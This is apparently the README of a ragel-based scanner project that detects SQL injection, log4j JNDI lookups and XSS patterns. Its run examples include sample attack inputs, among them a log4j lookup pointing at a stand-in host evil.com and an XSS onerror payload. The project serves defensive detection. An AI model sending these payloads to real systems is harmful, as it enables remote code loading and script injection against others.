# sql_ragel

用 ragel 把语法写成状态机的小实验。输入先走词法切 token，再在 token 流上跑状态机，识别 SQL 骨架、SQLi 攻击特征、log4j 查找表达式和 XSS 攻击特征。

## 内容

- `sql_syntax`：SQL 语法骨架，识别 `expr` / `select_stmt` / `constant_value`。
- `sqli_rules`：24 条 SQLi 攻击规则（恒真条件、布尔注入、UNION/堆叠、危险函数、子查询、语句片段等）。
- `log4j_lookup`：识别 `${...}` 表达式，按前缀归约分类 JNDI / SENSITIVE / CHAIN / EXPR。
- `xss_rules`：5 条 XSS 攻击规则（script 标签、危险标签、事件属性、危险 URI、实体编码）。

## 目录

```
rules/               规则源（.rl + .h），按类别分目录
  sql/               SQL 词法 / 语法骨架 / 共享片段 / 攻击规则
  log4j/             log4j 查找表达式
  xss/               HTML 词法 / 标签结构 / 攻击规则
sql_scan.c           驱动：打印 token 流和骨架命中
examples/            调用示例
  sqli_scan.c        sqli 驱动
  log4j_scan.c       log4j 驱动
  xss_scan.c         xss 驱动
  test_sqli.sh       sqli 断言
  test_log4j.sh      log4j 断言
  test_xss.sh        xss 断言
test.sh              sql 骨架断言
Makefile             构建（make / make test）
CMakeLists.txt       等价 cmake 构建
misc/                历史归档（ANTLR4 后端等）
```

## 构建与测试

需要 ragel 和 gcc。

```
make -j        # 构建 sql_scan / sqli_scan / log4j_scan / xss_scan
make test      # 跑四套断言（sql 骨架 / sqli / log4j / xss）
```

cmake 等价：

```
cmake -S . -B build && cmake --build build -j
cmake --build build --target validate_ragel
```

## 运行

```
./build/ragel/sql_scan  'SELECT * FROM users WHERE 1=1'
./build/ragel/sqli_scan '1=1 OR 1=2'
./build/ragel/log4j_scan '${jndi:ldap://evil.com/a}'
./build/ragel/xss_scan  '<img onerror=alert(1)>'
```

## 说明

- 规则只改 `.rl`，重新构建即可；生成的 C 是中间产物，不要手工改。
- 驱动只 include 头文件并链接 `libragel_sql.a`，不接触生成的 `.c`。
- 递归（括号嵌套、子查询）用 ragel 的 fcall/fret 实现，见各 `.rl` 头注释。
